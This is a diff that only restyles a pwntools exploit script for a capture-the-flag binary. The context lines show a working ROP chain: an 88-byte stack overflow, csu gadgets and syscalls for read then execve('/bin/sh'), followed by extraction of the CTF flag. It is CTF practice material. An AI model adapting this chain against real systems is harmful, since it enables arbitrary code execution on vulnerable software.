@@ -27,7 +27,14 @@ Usage:
 import sys
 import time
 from pwn import (
-    context, ELF, ROP, process, remote, u64, p64, log,
+    context,
+    ELF,
+    ROP,
+    process,
+    remote,
+    u64,
+    p64,
+    log,
 )
 
 context.clear(arch="amd64", os="linux", log_level="info")
@@ -38,6 +45,7 @@ BIN_CANDIDATES = [HERE + "/../chall", HERE + "/chall", "./chall"]
 
 def find_binary():
     import os
+
     for c in BIN_CANDIDATES:
         if os.path.exists(c):
             return os.path.abspath(c)
@@ -52,27 +60,27 @@ def preimage(payload: bytes, key: int) -> bytes:
 def build_chain(elf, rop):
     off = 88  # buf(rsp+0x10) -> saved RIP; see writeup for derivation
 
-    csu_pop = elf.symbols["csu_pop"]          # pop rbx;rbp;r12;r13;r14;r15;ret
-    marshal = elf.symbols["marshal_regs"]     # rdi=r13; rsi=r14; rdx=r15; ret
-    syscall = elf.symbols["syscall_ret"]      # syscall; ret
-    scratch = elf.symbols["scratch"]          # writable .bss, fixed address
+    csu_pop = elf.symbols["csu_pop"]  # pop rbx;rbp;r12;r13;r14;r15;ret
+    marshal = elf.symbols["marshal_regs"]  # rdi=r13; rsi=r14; rdx=r15; ret
+    syscall = elf.symbols["syscall_ret"]  # syscall; ret
+    scratch = elf.symbols["scratch"]  # writable .bss, fixed address
     pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
 
-    J = 0xdead  # junk for rbx/rbp/r12
+    J = 0xDEAD  # junk for rbx/rbp/r12
 
     def csu(rbx, rbp, r12, r13, r14, r15):
         return b"".join(p64(x) for x in (csu_pop, rbx, rbp, r12, r13, r14, r15))
 
     chain = b"A" * off
     # stage 1: read(0, scratch, 16)  -> stage "/bin/sh\0"
-    chain += csu(J, J, J, 0, scratch, 16)     # r13=fd=0, r14=buf, r15=count
-    chain += p64(marshal)                     # rdi=0, rsi=scratch, rdx=16
-    chain += p64(pop_rax) + p64(0)            # SYS_read = 0
+    chain += csu(J, J, J, 0, scratch, 16)  # r13=fd=0, r14=buf, r15=count
+    chain += p64(marshal)  # rdi=0, rsi=scratch, rdx=16
+    chain += p64(pop_rax) + p64(0)  # SYS_read = 0
     chain += p64(syscall)
     # stage 2: execve(scratch, 0, 0)
-    chain += csu(J, J, J, scratch, 0, 0)      # r13=path, r14=argv=0, r15=envp=0
-    chain += p64(marshal)                     # rdi=scratch, rsi=0, rdx=0
-    chain += p64(pop_rax) + p64(59)           # SYS_execve = 59
+    chain += csu(J, J, J, scratch, 0, 0)  # r13=path, r14=argv=0, r15=envp=0
+    chain += p64(marshal)  # rdi=scratch, rsi=0, rdx=0
+    chain += p64(pop_rax) + p64(59)  # SYS_execve = 59
     chain += p64(syscall)
     return chain
 
@@ -119,6 +127,7 @@ def main():
 
     # Best-effort extract.
     import re
+
     m = re.search(rb"CTF\{[^}]*\}", data)
     if m:
         log.success("flag: %s", m.group(0).decode())
